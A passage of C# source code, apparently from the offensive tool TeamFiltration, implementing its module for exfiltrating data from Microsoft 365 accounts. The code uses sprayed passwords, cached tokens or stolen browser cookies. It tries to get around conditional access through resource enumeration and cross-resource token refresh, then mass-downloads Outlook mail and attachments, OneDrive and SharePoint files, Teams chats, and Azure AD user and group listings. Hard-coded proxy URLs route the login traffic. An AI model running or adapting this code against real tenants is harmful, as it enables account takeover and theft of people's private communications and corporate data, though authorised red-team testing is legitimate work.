using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net.Http;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using TeamFiltration.Models.Teams;
using TeamFiltration.Models.MSOL;
using System.Threading.Tasks;
using System.IO;
using TeamFiltration.Handlers;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Helpers;
using KoenZomers.OneDrive.Api;
using KoenZomers.OneDrive.Api.Entities;
using Dasync.Collections;
using TeamFiltration.Models.Graph;
using System.Net;
using System.Text;
using System.IdentityModel.Tokens.Jwt;
using System.Threading;
using MoreLinq;

namespace TeamFiltration.Modules
{

    public class ExifilOptions
    {

        public ExifilOptions(string[] args)
        {
            if (args.Contains("--owa"))
                this.OWA = true;

            if (args.Contains("--aad"))
                this.AAD = true;

            if (args.Contains("--teams"))
                this.Teams = true;

            if (args.Contains("--jwt-tokens"))
                this.Tokens = true;



            if (args.Contains("--onedrive"))
                this.OneDrive = true;

            // if (args.Select(x => x.ToLower()).Contains("--sharepoint"))
            //    this.SharePoint = true;

            if (args.Contains("--all"))
            {
                this.OneDrive = true;
                this.Teams = true;
                this.AAD = true;
                this.OWA = true;
                this.Tokens = true;

            }

        }

        public bool OneDrive { get; set; } = false;
        public bool Teams { get; set; } = false;
        public bool OWA { get; set; } = false;
        public bool AAD { get; set; } = false;
        public bool Tokens { get; set; } = false;


    }
    public class Exfiltrate
    {
        private static GlobalArgumentsHandler _globalProperties { get; set; }
        private static DatabaseHandler _databaseHandler { get; set; }

        private static async Task PrepareExfil(SprayAttempt accObject, ExifilOptions exfilOptions, MSOLHandler msolHandler)
        {
            try
            {
                Console.WriteLine();
                Console.WriteLine("[!] The exfiltration modules does not use FireProx, ORIGIN IP WILL BE LOGGED, are you an adult? (Y/N)");
                var response = Console.ReadLine();

                if (!response.ToUpper().Equals("Y"))
                {
                    return;
                }

                //We check if our spray gave us a valid token, and that the token is valid
                var latestPulledToken = _databaseHandler.TokenAvailable(accObject, "https://api.spaces.skype.com");

                //If so, use that token
                if (!string.IsNullOrEmpty(latestPulledToken))
                {
                    //Use that token to star the Exfil process
                    await ExfilFromToken(JsonConvert.DeserializeObject<BearerTokenResp>(latestPulledToken), _globalProperties.OutPutPath, exfilOptions, msolHandler, accObject);
                }
                else if (!accObject.ConditionalAccess)
                {
                    //The token has expired, attempt to login and move on!
                    var freshToken = await msolHandler.LoginAttemptFireProx(
                        accObject.Username,
                        accObject.Password,
                        _globalProperties.GetFireProxURL(),
                        (accObject.ResourceUri, accObject.ResourceClientId));

                    await ExfilFromToken(
                        freshToken.bearerToken,
                        _globalProperties.OutPutPath,
                        exfilOptions,
                        msolHandler,
                        accObject
                        );

                }
                else if (accObject.ConditionalAccess)
                {
                    //Conditonal Access, let's enum
                    _databaseHandler.WriteLog(new Log("EXFIL", $"Attemping to bypass conditional access policy ", "") { }, true);

                    //Enumerate a valid ressources to access based on conditional access policy
                    var validResc = await EnumerateConditionalAccess(accObject.Username, accObject.Password, msolHandler, true);

                    //Use that ressources token to start the exfil proccess

                    if (string.IsNullOrEmpty(validResc?.ResponseData))
                        _databaseHandler.WriteLog(new Log("EXFIL", $"Not able to bypass the conditional access policy :( ", "") { }, true);
                    else
                        await ExfilFromToken(JsonConvert.DeserializeObject<BearerTokenResp>(validResc.ResponseData), _globalProperties.OutPutPath, exfilOptions, msolHandler, accObject);

                    // await ExfilFromToken(accObject.Username, accObject.Password, _globalProperties.OutPutPath, exfilOptions, (EnumeratedConditionalAccess)accObject);
                }
                else
                {
                    _databaseHandler.WriteLog(new Log("EXFIL", $"We are for some reason denied access, changed passwords? => {accObject.ResponseCode}", "") { }, true);
                }
            }
            catch (Exception ex)
            {
                _databaseHandler.WriteLog(new Log("EXFIL", $" SOFT ERROR EXFIL {accObject.Username} => {ex.Message}", "") { }, true);
            }

        }

        public static async Task ExfiltrateAsync(string[] args)
        {
            _globalProperties = new GlobalArgumentsHandler(args);

            _databaseHandler = new DatabaseHandler(_globalProperties);

            MSOLHandler msolHandler = new MSOLHandler(_globalProperties, "EXFIL", _databaseHandler);

            var exfilOptions = new ExifilOptions(args);


            if (args.Contains("--username") && args.Contains("--password"))
            {
                var username = args.GetValue("--username");
                var password = args.GetValue("--password");

                await PrepareExfilCreds(username, password, exfilOptions, msolHandler);

            }
            else if (args.Contains("--cookie-dump"))
            {
                Console.WriteLine("[+] Reading cookie dump file");

                if (File.Exists(args.GetValue("--cookie-dump")))
                {
                    try
                    {
                        List<CookieObject> cookieDumpObjects = JsonConvert.DeserializeObject<List<CookieObject>>(File.ReadAllText(args.GetValue("--cookie-dump")));

                        await CookieExfilAccountAsync(_globalProperties.OutPutPath, cookieDumpObjects, exfilOptions, msolHandler);
                    }
                    catch (JsonException ex)
                    {

                        Console.WriteLine("[!] Failed to deserialize cookie dump file, does the format match SharpChrome's output?");
                        Environment.Exit(0);
                    }


                }
                else
                {
                    Console.WriteLine("[!] Invalid path given, could not find cookie dump!");
                }


            }
            else
            {
                //Query a list of valid logins for users
                var validLogins = _databaseHandler.QueryValidLogins().Where(x => x.AADSSO == false).ToList();

                //If we have any valid logins
                if (validLogins.Count() > 0)
                {

                    int options = 0;
                    Console.WriteLine("[+] You can select multiple users using syntax 1,2,3 or 1-3");
                    foreach (var loginObject in validLogins)
                    {
                        Console.WriteLine($"    |-> {options++} - {loginObject.Username}");

                    }
                    Console.WriteLine($"    |-> ALL - Everyone!");
                    Console.WriteLine();
                    Console.Write("[?] What user to target ? #> ");
                    var selection = Console.ReadLine();

                    if (selection.ToLower().StartsWith("ALL".ToLower()))
                    {
                        foreach (SprayAttempt accObject in validLogins)
                        {
                            await PrepareExfil(accObject, exfilOptions, msolHandler);

                        }
                    }
                    else if (selection.Contains("-"))
                    {
                        if (selection.Split("-").Length > 2)
                        {
                            int start = Convert.ToInt32(selection.Split("-")[0]);
                            int end = Convert.ToInt32(selection.Split("-")[1]);
                            foreach (var accObject in validLogins.GetRange(start, end - start))
                            {
                                await PrepareExfil(accObject, exfilOptions, msolHandler);

                            }
                        }
                        else
                        {
                            Console.WriteLine("[+] Provided format must be <START INDEX>-<STOP INDEX>");
                        }
                    }
                    else if (selection.Contains(","))
                    {
                        var intArray = selection.Split(",").Select(x => Convert.ToInt32(x));

                        foreach (var intSelection in intArray)
                        {
                            await PrepareExfil(validLogins[intSelection], exfilOptions, msolHandler);
                        }

                    }
                    else
                    {

                        var accObject = validLogins[Convert.ToInt32(selection)];

                        await PrepareExfil(accObject, exfilOptions, msolHandler);
                    }
                }

            }
        }
        private static async Task<EnumeratedConditionalAccess> EnumerateConditionalAccess(string username, string password, MSOLHandler msolHandler, bool stopAtValid = false)
        {
            var validResList = new List<EnumeratedConditionalAccess> { };
            var resList = Helpers.Generic.GetResc();

            var alreadyEnumedrated = _databaseHandler.QueryEnumeratedConditionalAccess(username);

            if (alreadyEnumedrated?.Count() > 0)
                return alreadyEnumedrated.FirstOrDefault();
            else
            {


                #region userCreds
                /*
                var proxyURL = "";
              

                foreach (var resource in resList)
                {
                    var loginResp = await msolHandler.LoginAttemptFireProx(username, password, proxyURL, resource);

                    if (loginResp.bearerTokenError == null)
                    {
                        validResList.Add(resource);
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => CAN ACCESS", "[EU]") { }, true);
                    }
                    else
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => DENIED ACCESS", "[EU]") { }, true);
                    }

                }
                */
                #endregion
                var proxyURL = _globalProperties.GetFireProxURL();
                foreach (var resource in resList)
                {
                    var loginResp = await msolHandler.LoginAttemptFireProx(username, password, proxyURL, resource);

                    if (loginResp.bearerTokenError == null)
                    {
                        validResList.Add(new EnumeratedConditionalAccess() { ResourceClientId = resource.clientId, ResourceUri = resource.uri, Username = username, ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken) });
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => CAN ACCESS", "[US]") { }, true);
                        if (stopAtValid)
                            break;

                    }
                    else
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => DENIED ACCESS", "[US]") { }, true);

                    }

                }

                _databaseHandler.WriteEnumeratedConditionalAccess(validResList);

                return validResList.FirstOrDefault();
            }
        }
        private static async Task<List<(string uri, string clientId)>> EnumerateConditionalAccess(string username, BearerTokenResp bearerToken, MSOLHandler msolHandler)
        {
            var validResList = new List<EnumeratedConditionalAccess> { };
            var resList = Helpers.Generic.GetResc();

            List<EnumeratedConditionalAccess> alreadyEnumedrated = _databaseHandler.QueryEnumeratedConditionalAccess(username);

            if (alreadyEnumedrated?.Count() > 0)
                return alreadyEnumedrated.Select(x => (x.ResourceUri, x.ResourceClientId)).ToList();
            else
            {
                #region userCreds
                /*
                var proxyURL = "https://ldhrjli2af.execute-api.eu-west-3.amazonaws.com/fireprox/common/oauth2/token";
          

                foreach (var resource in resList)
                {
                    var loginResp = await msolHandler.RefreshAttempt(bearerToken, proxyURL, resource.uri, resource.clientId);

                    if (loginResp.bearerTokenError == null)
                    {
                        validResList.Add(resource);
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => CAN ACCESS", "[EU]") { }, true);
                    }
                    else
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => DENIED ACCESS", "[EU]") { }, true);
                    }

                }
                */
                var proxyURL = "https://694qkn4gp3.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token";
                foreach (var resource in resList)
                {
                    var loginResp = await msolHandler.RefreshAttempt(bearerToken, proxyURL, resource.uri, resource.clientId, false, false);

                    if (loginResp.bearerTokenError == null)
                    {
                        validResList.Add(new EnumeratedConditionalAccess() { ResourceClientId = resource.clientId, ResourceUri = resource.uri, Username = username });
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => CAN ACCESS", "[US]") { }, true);

                    }
                    else
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", $" URI { resource.uri } CLIENTID {resource.clientId} => DENIED ACCESS", "[US]") { }, true);

                    }

                }
                #endregion

                _databaseHandler.WriteEnumeratedConditionalAccess(validResList);

                return validResList.Select(x => (x.ResourceUri, x.ResourceClientId)).ToList();
            }
        }
        private static async Task PrepareExfilCreds(string username, string password, ExifilOptions exfilOptions, MSOLHandler msolHandler)
        {

            _databaseHandler.WriteLog(new Log("EXFIL", $"Attempting to exfiltrate using credentials for {username}", "") { }, true);

            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) validResponse = (null, null);

            //Conditonal Access, let's enum
            _databaseHandler.WriteLog(new Log("EXFIL", $"Attemping to bypass conditional access policy ", "") { }, true);

            //Enumerate a valid ressources to access based on conditional access policy
            EnumeratedConditionalAccess enumeratedConditionalAccess = await EnumerateConditionalAccess(username, password, msolHandler, false);

            //Check if the valid response we got has some responseData
            if (string.IsNullOrEmpty(enumeratedConditionalAccess?.ResponseData))
                _databaseHandler.WriteLog(new Log("EXFIL", $"Not able to bypass the conditional access policy :( ", "") { }, true);
            else
            {
                //Turn that into a bearerToken
                validResponse.bearerToken = JsonConvert.DeserializeObject<BearerTokenResp>(enumeratedConditionalAccess?.ResponseData);

                //Check for cross-refresh
                var crossRefresh = await msolHandler.RefreshAttempt(validResponse.bearerToken, _globalProperties.GetFireProxURL(), "https://api.spaces.skype.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");

                //If so, procceed
                if (crossRefresh.bearerToken?.access_token != null)
                {
                    _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh allowed, we can exfil all that things!", "") { }, true);
                    await RefreshExfilAccountAsync(_globalProperties.OutPutPath, crossRefresh.bearerToken, exfilOptions, msolHandler);
                }
                else
                {
                    _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh NOT allowed, exfil capabilities may be limited!", "") { }, true);
                    await LoginExfilAccountAsync(_globalProperties.OutPutPath, username, password, validResponse.bearerToken, exfilOptions, msolHandler, enumeratedConditionalAccess.ResourceClientId);
                }



            }
        }
        private static async Task ExfilFromToken(BearerTokenResp tokenObject, string outpath, ExifilOptions exifilOptions, MSOLHandler msolHandler, SprayAttempt accObject)
        {

            _databaseHandler.WriteLog(new Log("EXFIL", $"Attempting to exfiltrate using provided token", "") { }, true);
            if (accObject.CanRefresh)
                await RefreshExfilAccountAsync(outpath, tokenObject, exifilOptions, msolHandler);
            else
            {

                //At this point we have a token for a valid ressource, let's try to refresh this into another ressource, confirming cross-refresh 
                var notTheSameRessource = Helpers.Generic.RandomO365Res("https://api.spaces.skype.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");

                var tempToken = await msolHandler.RefreshAttempt(tokenObject, _globalProperties.GetFireProxURL(), notTheSameRessource.Uri, notTheSameRessource.clientId);

                if (tempToken.bearerToken != null)
                {

                    var crossRefresh = await msolHandler.RefreshAttempt(tempToken.bearerToken, _globalProperties.GetFireProxURL(), "https://api.spaces.skype.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264");
                    if (crossRefresh.bearerToken?.access_token != null)
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh allowed, we can exfil all that things!", "") { }, true);
                        accObject.CanRefresh = true;
                        _databaseHandler.UpdateAccount(accObject);
                        await RefreshExfilAccountAsync(outpath, crossRefresh.bearerToken, exifilOptions, msolHandler);
                    }
                    else
                    {
                        //TODO: Should we add some sort of logic to attemp to exfil using logins and not tokens?
                        _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh NOT allowed, exfil capabilities may be limited!", "") { }, true);
                        await RefreshExfilAccountAsync(outpath, tempToken.bearerToken, exifilOptions, msolHandler);
                    }


                }
                else
                {
                    //If this failed, we cannot refresh, but we still have a token, let's attemp exfil with that
                    if (string.IsNullOrEmpty(tokenObject?.access_token))
                        _databaseHandler.WriteLog(new Log("EXFIL", $"Failed to retrive token, skipping!", "") { }, true);
                    else
                    {
                        _databaseHandler.WriteLog(new Log("EXFIL", $"Cross-resource-refresh NOT allowed, exfil capabilities may be limited!", "") { }, true);
                        await RefreshExfilAccountAsync(outpath, tokenObject, exifilOptions, msolHandler);

                    }

                }
            }

        }

        #region baseExfilFunctions
        private static async Task OneDriveExfilAsync(BearerTokenResp companySharePointToken, BearerTokenResp msGraphToken, BearerTokenResp teamsToken, BearerTokenResp personalSharePointToken, string outpath)
        {
            var username = Helpers.Generic.GetUsername(teamsToken.access_token);
            var sharePointHandler = new SharePointHandler(companySharePointToken, username, _globalProperties);
            var personalSharePointHandler = new SharePointHandler(personalSharePointToken, username, _globalProperties);
            var oneDriveGrapHandler = new OneDriveHandler(msGraphToken, username, _globalProperties, _databaseHandler);
            var teamsHandler = new TeamsHandler(teamsToken, _globalProperties);




            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating shared files from OneDrive", "") { }, true);
            await oneDriveGrapHandler.GetShared(outpath);


            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating the entire personal OneDrive", "") { }, true);
            await oneDriveGrapHandler.DumpPersonalOneDrive(outpath);


            TeamsFileResp recentFiles = await teamsHandler.GetRecentFiles("EXFIL");


            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating {recentFiles.value.Length} recent files accessible by user", "") { }, true);

            await sharePointHandler.DownloadRecentFiles(recentFiles, outpath, "EXFIL");

            await oneDriveGrapHandler.DownloadRecentFiles(recentFiles, outpath, "EXFIL");

            await personalSharePointHandler.DownloadRecentFiles(recentFiles, outpath, "EXFIL");


        }
        private static async Task TeamsExfilAsync(BearerTokenResp teamsToken, BearerTokenResp oneDriveToken, string outpath)
        {

            var userId = Helpers.Generic.GetUserId(teamsToken.access_token);
            var username = Helpers.Generic.GetUsername(teamsToken.access_token);

            var teamsHandler = new TeamsHandler(teamsToken, _globalProperties);
            //var oneDriveHandler = new OneDriveHandler(graphToken, username, _teamFiltrationConfig);



            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating recently used contacts", "") { }, true);
            var contactListLogsOutPath = Path.Combine(outpath, "Contactlist");
            Directory.CreateDirectory(contactListLogsOutPath);

            var contactsInfo = await teamsHandler.GetWorkingWithList(userId);
            File.WriteAllText(Path.Combine(contactListLogsOutPath, "Contacts.json"), JsonConvert.SerializeObject(contactsInfo, Formatting.Indented));

            if (true)//if (oneDriveHandler != null)
            {
                //We need a skype token to get other stuff
                await teamsHandler.SetSkypeToken();

                _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating all sent attachments from chat logs", "") { }, true);

                var attachmentsLogsOutPath = Path.Combine(outpath, "Attachments");
                Directory.CreateDirectory(attachmentsLogsOutPath);
                var chatsInfo = await teamsHandler.GetConversations();

                List<Conversations> conversationList = new List<Conversations>() { };
                //Get SharePoint address
                foreach (var conversation in chatsInfo.conversations)
                {
                    var chatsLogs = await teamsHandler.GetChatLogs(conversation);
                    if (chatsLogs.messages != null)
                    {
                        var bufferConv = new Conversations(chatsLogs, conversation);
                        conversationList.Add(bufferConv);

                        foreach (var item in bufferConv.chatMessagesArray.Where(x => x.Properties?.files != null))
                        {
                            foreach (var fileObject in item.FileObject)
                            {
                                try
                                {
                                    using (var httpClient = new HttpClient())
                                    {


                                        //We need to look at the baseURL to determine what client to
                                        var url = @$"{fileObject.baseUrl}/_api/web/GetFileById('{fileObject.id}')/$value";

                                        var httpReq = new HttpRequestMessage(HttpMethod.Get, url);

                                        httpReq.Headers.Add("Authorization", $"Bearer {oneDriveToken.access_token}");

                                        var oneDriveReq = await httpClient.SendAsync(httpReq);

                                        var rawData = await oneDriveReq.Content.ReadAsByteArrayAsync();

                                        File.WriteAllBytes(Path.Combine(attachmentsLogsOutPath, fileObject.fileName), rawData);
                                    }
                                    //await oneDriveHandler.DownloadAttachment(file, attachmentsLogsOutPath, "EXFIL", personalOneDriveToken.bearerToken.access_token);

                                }
                                catch (Exception ex)
                                {

                                }

                            }

                        }
                    }
                }

                _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating all chat logs/conversations", "") { }, true);
                var conversationLogsOutPath = Path.Combine(outpath, "Conversations");
                Directory.CreateDirectory(conversationLogsOutPath);

                foreach (var conversationObject in conversationList)
                {
                    File.WriteAllText(Path.Combine(conversationLogsOutPath, Helpers.Generic.StringToGUID(conversationObject.Id) + ".txt"),
                        JsonConvert.SerializeObject((ConversationsSimple)(conversationObject, contactsInfo), Formatting.Indented));

                }

            }

        }
        private static async Task OWAExfilAsync(BearerTokenResp outlookToken, string outpath)
        {



            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating emails from Outlook!", "") { }, true);
            var username = Helpers.Generic.GetUsername(outlookToken.access_token);

            var tokenExpires = DateTime.Now.AddSeconds(Convert.ToInt32(outlookToken.expires_in));

            OWAHandler oWAHandler = new OWAHandler(outlookToken, _globalProperties);
            var outlookOutPath = Path.Combine(outpath, "Emails");
            Directory.CreateDirectory(outlookOutPath);
            var allEmailsJsonPath = Path.Combine(outlookOutPath, "AllEmails.json");

            Models.OWA.AllEmailsResp allEmailObjects = null;
            if (File.Exists(allEmailsJsonPath))
                allEmailObjects = JsonConvert.DeserializeObject<Models.OWA.AllEmailsResp>(File.ReadAllText(allEmailsJsonPath));
            else
            {
                allEmailObjects = await oWAHandler.GetAllEmails(_globalProperties.OwaLimit);
                File.WriteAllText(allEmailsJsonPath, JsonConvert.SerializeObject(allEmailObjects, Formatting.Indented));
            }
            var skipList = Directory.GetFiles(outlookOutPath, "*.html").Select(x => x.Split("_")[0].Substring(x.Split("_")[0].Length - 5)).ToArray().ToList();

            allEmailObjects.value = allEmailObjects.value.Where(x => !skipList.Contains(Helpers.Generic.StringToGUID(x.Id).ToString().Split("-")[0].Substring(0, 5))).ToList();

            if (allEmailObjects.value != null)
            {

                allEmailObjects.value = allEmailObjects.value.DistinctBy(x => x.Id).ToList();

                _databaseHandler.WriteLog(new Log("EXFIL", $"Fetched {allEmailObjects.value.Count()} email ID's , exfiltrating content!", "") { }, true);

                var outlookAttachmentOutPath = Path.Combine(outpath, "EmailAttachments");
                Directory.CreateDirectory(outlookAttachmentOutPath);

                int emailCount = 0;
                int TotalemailCount = allEmailObjects.value.Count();
                using (var progress = new ProgressBar())
                {


                    await allEmailObjects.value.ToArray().ParallelForEachAsync(
                      async emailObject =>
                      {
                          try
                          {
                              //This is probably gonna take awhile, make sure the token dosent expire
                              if (tokenExpires >= DateTime.Now.AddMinutes(1))
                              {

                                  var oneEmail = await oWAHandler.GetEmailBody(emailObject.Id);

                                  if (oneEmail.rateLimitData.RateLimitRemaining < 10 && !string.IsNullOrEmpty(oneEmail.emailResp.Id))
                                  {
                                      Thread.Sleep((int)(oneEmail.rateLimitData.RateLimitReset - DateTime.Now).TotalMilliseconds);
                                  }

                                  if (oneEmail.emailResp.HasAttachments)
                                  {
                                      try
                                      {
                                          var attachmentObject = await oWAHandler.GetEmailAttachments(emailObject.Id);
                                          if (attachmentObject?.value != null)
                                          {
                                              foreach (var fileItem in attachmentObject?.value.Where(x => !string.IsNullOrEmpty(x.ContentType) && !string.IsNullOrEmpty(x.ContentBytes)).ToArray())
                                              {
                                                  byte[] dataContent = System.Convert.FromBase64String(fileItem.ContentBytes);

                                                  File.WriteAllBytes(Path.Combine(outlookAttachmentOutPath, ((DateTimeOffset)fileItem.LastModifiedDateTime).ToUnixTimeSeconds().ToString() + "_" + fileItem.Name), dataContent);
                                              }

                                          }

                                      }
                                      catch (Exception ex)
                                      {
                                          _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR dumping attachments {oneEmail.emailResp.Subject}=> {ex.Message}", "") { }, true);

                                      }

                                  }



                                  if (oneEmail.emailResp?.Id != null && oneEmail.emailResp?.ReceivedDateTime != null && oneEmail.emailResp.Subject != null && !string.IsNullOrEmpty(oneEmail.emailResp.Body.Content))
                                  {
                                      var uniqID = Helpers.Generic.StringToGUID(emailObject.Id).ToString().Split("-")[0];

                                      var fileName = uniqID + "_" + Helpers.Generic.MakeValidFileName(oneEmail.emailResp.Subject).Replace(" ", "_").Replace("@", "_") + ".html";


                                      int maxFilename = 250 - outlookOutPath.Length;

                                      if (fileName.Length >= maxFilename)
                                          fileName = fileName.Substring(0, maxFilename);

                                      var filePath = Path.Combine(outlookOutPath, fileName);
                                      if (!File.Exists(filePath))
                                      {
                                          File.WriteAllText(
                                              filePath,
                                              oneEmail.emailResp.Body.Content
                                            );
                                      }
                                      emailCount++;
                                      progress.Report((double)emailCount / TotalemailCount);
                                  }


                              }
                              else
                              {
                                  //One minutes before expiration, we refresh the token
                                  await oWAHandler.RefreshAccessToken();
                                  tokenExpires = DateTime.Now.AddSeconds(Convert.ToInt32(oWAHandler._bearerToken.expires_in));
                              }
                          }
                          catch (Exception ex)
                          {
                              _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR getting email ID {emailObject.Id}=> {ex.Message}", "") { }, true);


                          }
                      },
                      maxDegreeOfParallelism: 7
                      );

                }

            }

        }
        public static async Task MsGraphExfilAsync(BearerTokenResp msGraphToken, string baseUserOutPath, bool logDb = true)
        {
            if (logDb)
                _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating AAD users and groups via MS graph API", "") { }, true);
            GraphHandler graphHandler = new GraphHandler(msGraphToken, Helpers.Generic.GetUsername(msGraphToken.access_token));
            var username = Helpers.Generic.GetUsername(msGraphToken.access_token);
            var graphUsers = await graphHandler.GetUsersMsGraph();


            var filteredUserPrincipalNames = graphUsers.value.Where(x => x.userPrincipalName.EndsWith("@" + username.Split("@")[1])).ToList();
            if (logDb)
                _databaseHandler.WriteLog(new Log("EXFIL", $"Got {filteredUserPrincipalNames.Count} AAD users, appending to database as valid users!", "") { }, true);
            await filteredUserPrincipalNames.ParallelForEachAsync(
                 async upn =>
                 {
                     if (logDb)
                         _databaseHandler.WriteValidAcc(new ValidAccount() { Username = upn.userPrincipalName.Trim().ToLower(), Id = Helpers.Generic.StringToGUID(upn.userPrincipalName.Trim().ToLower()).ToString() });
                 },
                   maxDegreeOfParallelism: 700);


            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Users.txt"), string.Join('\n', graphUsers.value.Select(x => x.userPrincipalName).ToList()));
            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Users.json"), JsonConvert.SerializeObject(graphUsers, Formatting.Indented));


            var graphDomains = await graphHandler.GetDomainsMsGraph();
            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Domains.json"), JsonConvert.SerializeObject(graphDomains, Formatting.Indented));



            Models.Graph.GroupsResp adGroups = await graphHandler.GetGroupsMsGraph();
            File.WriteAllText(Path.Combine(baseUserOutPath, "MsGraph_Groups.json"), JsonConvert.SerializeObject(adGroups, Formatting.Indented));

            //var adGroups = JsonConvert.DeserializeObject<GroupsResp>(File.ReadAllText(Path.Combine(baseUserOutPath, "AADGroups.json")));
            var userGroupRelations = new StringBuilder();
            try
            {


                await adGroups?.Value.ParallelForEachAsync(
                async groupObject =>
                {
                    try
                    {


                        var domainGroups = await graphHandler.GetGroupMembersMsGraph(groupObject?.id);

                        foreach (var user in domainGroups?.value)
                        {
                            var userName = (string.IsNullOrEmpty(user.userPrincipalName)) ? user.mail : user.userPrincipalName;

                            if (!string.IsNullOrEmpty(userName))
                                userGroupRelations.AppendLine($"{user.userPrincipalName}:{groupObject.displayName}");
                        }
                    }
                    catch (Exception ex)
                    {


                    }

                },
                maxDegreeOfParallelism: 70);
            }
            catch (Exception ex)
            {


            }

            var filePath = Path.Combine(baseUserOutPath, "MsGraph_Groups.txt");
            File.WriteAllText(filePath, userGroupRelations.ToString());

        }
        private static async Task AdGraphExfilAsync(BearerTokenResp adGraphToken, string baseUserOutPath)
        {

            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating AAD users and groups via MS AD Graph API", "") { }, true);
            var tenantId = Helpers.Generic.GetTenantId(adGraphToken.access_token);
            GraphHandler graphHandler = new GraphHandler(adGraphToken, Helpers.Generic.GetUsername(adGraphToken.access_token));

            var adUsers = await graphHandler.GetUsersAdGraph(tenantId);

            if (adUsers?.value != null)
            {
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Users.txt"), string.Join('\n', adUsers.value?.Select(x => x?.userPrincipalName).ToList()));
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Users.json"), JsonConvert.SerializeObject(adUsers, Formatting.Indented));
            }
            var aadDomains = await graphHandler.GetDomainsAdGraph(tenantId);

            if (aadDomains?.value != null)
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Domains.json"), JsonConvert.SerializeObject(aadDomains, Formatting.Indented));

            var aadGroups = await graphHandler.GetGroupsAdGraph(tenantId);
            if (aadGroups?.value != null)
                File.WriteAllText(Path.Combine(baseUserOutPath, "AdGraph_Groups.json"), JsonConvert.SerializeObject(aadGroups, Formatting.Indented));


            var userGroupRelations = new StringBuilder();

            if (aadGroups?.value != null)
            {
                await aadGroups?.value?.ParallelForEachAsync(
                    async groupObject =>
                    {
                        var domainGroups = await graphHandler.GetGroupMembersAdGraph(groupObject.objectId, tenantId);

                        foreach (var user in domainGroups.value)
                        {
                            try
                            {


                                var userName = (string.IsNullOrEmpty(user.userPrincipalName)) ? user.mail : user.userPrincipalName;
                                //sr.WriteLine($"{userName}:{groupObject.displayName}");
                                if (!string.IsNullOrEmpty(userName))
                                    userGroupRelations.AppendLine($"{user.userPrincipalName}:{groupObject.onPremisesSamAccountName}");
                            }
                            catch (Exception)
                            {


                            }
                        }

                    },
                    maxDegreeOfParallelism: 70);

                var filePath = Path.Combine(baseUserOutPath, "AdGraph_Groups.txt");
                File.WriteAllText(filePath, userGroupRelations.ToString());
            }
        }

        #endregion
        private static async Task LoginExfilAccountAsync(string outpath, string usernameCreds, string passwordCreds, BearerTokenResp inputToken, ExifilOptions exifilOptions, MSOLHandler msolHandler, string clientId)
        {
            //Does client ID matter? how can we determen what ClientID to use in this case?

            TeamsHandler teamsHandler = new TeamsHandler(inputToken, _globalProperties);

            List<GetTenatsResp> tenantInfo = await teamsHandler.GetTenantsInfo();
            FilesAvailabilityResp sharePointInfo = await teamsHandler.GetSharePointInfo();

            string username = Helpers.Generic.GetUsername(inputToken.access_token);

            var baseUserOutPath = Path.Combine(outpath, Helpers.Generic.MakeValidFileName(username));
            Directory.CreateDirectory(baseUserOutPath);

            File.WriteAllText(Path.Combine(baseUserOutPath, "Tenant.json"), JsonConvert.SerializeObject(tenantInfo, Formatting.Indented));
            File.WriteAllText(Path.Combine(baseUserOutPath, "SharePoint.json"), JsonConvert.SerializeObject(sharePointInfo, Formatting.Indented));


            string companySharePointUrl = "";
            string personalSharePointUrl = "";

            if (sharePointInfo?.personalRootFolderUrl == null)
            {

                _databaseHandler.WriteLog(new Log("EXFIL", $"User has not been configured / licensed for o365, skipping OneDrive/SharePoint", "") { }, true);
                sharePointInfo = new FilesAvailabilityResp();
                sharePointInfo.personalRootFolderUrl = "invalid";
                exifilOptions.OneDrive = false;
                exifilOptions.Teams = false;

            }
            else
            {
                companySharePointUrl = sharePointInfo.personalRootFolderUrl.Replace("-my", "");
                personalSharePointUrl = sharePointInfo.personalRootFolderUrl;
            }

            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) companySharePointToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) personalOneDriveToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
